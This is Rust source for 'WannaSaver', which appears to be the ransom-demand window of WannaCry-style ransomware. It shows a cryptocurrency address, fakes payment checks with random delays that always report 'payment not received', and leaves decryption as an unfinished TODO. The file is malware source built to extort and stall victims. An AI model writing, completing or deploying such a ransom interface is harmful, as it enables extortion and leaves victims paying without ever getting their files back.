#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod renderer;

use rand::Rng;
use renderer::render;
use lib::config::control::CRYPTO_ADDRESS;
use iced::{Sandbox, Settings, Theme};
use std::{thread, time::Duration};

struct WannaSaver {
    textbox_text: String,
    console_logs: Vec<String>,
    checked: bool,
    decrypted: bool
}

#[derive(Debug, Clone)]
enum Message {
    TextChanged(String),
    Decrypt,
    CheckPayment,
    TryDecrypt,
}

impl Sandbox for WannaSaver {
    type Message = Message;

    fn new() -> Self {
        Self {
            textbox_text: CRYPTO_ADDRESS.to_string(),
            console_logs: vec![],
            checked: false,
            decrypted: false
        }
    }

    fn title(&self) -> String {
        String::from("WannaSaver")
    }

    fn theme(&self) -> Theme {
        Theme::Dark
    }

    fn update(&mut self, message: Self::Message) {
        match message {
            Message::TextChanged(text) => {
                self.textbox_text = text;
            }

            Message::Decrypt => {
                if !self.checked {
                    self.log("check your payment first");
                    return;
                }

                self.log("verifying...");
                let time: u64 = rand::thread_rng().gen_range(45..130);
                thread::sleep(Duration::from_secs(time));
            }

            Message::CheckPayment => {
                self.log("checking payment...");
                let time: u64 = rand::thread_rng().gen_range(20..60);
                thread::sleep(Duration::from_secs(time));

                self.log("payment not received");
                self.checked = true;
            }

            Message::TryDecrypt => {
                if self.decrypted {
                    self.log("already decrypted");
                    return;
                }

                self.decrypted = true;
                self.log("decrypting...");

                // TODO
            }
        }
    }

    fn view(&self) -> iced::Element<Message> {
        render(self)
    }
}

impl WannaSaver {
    fn log(&mut self, data: &str) {
        self.console_logs.push(format!("{}", data));

        if self.console_logs.len() > 16 {
            self.console_logs.remove(0);
        }
    }
}

fn main() -> iced::Result {
    WannaSaver::run(Settings {
        window: iced::window::Settings {
            size: (800, 450),
            resizable: false,
            ..Default::default()
        },

        ..Default::default()    
    })
}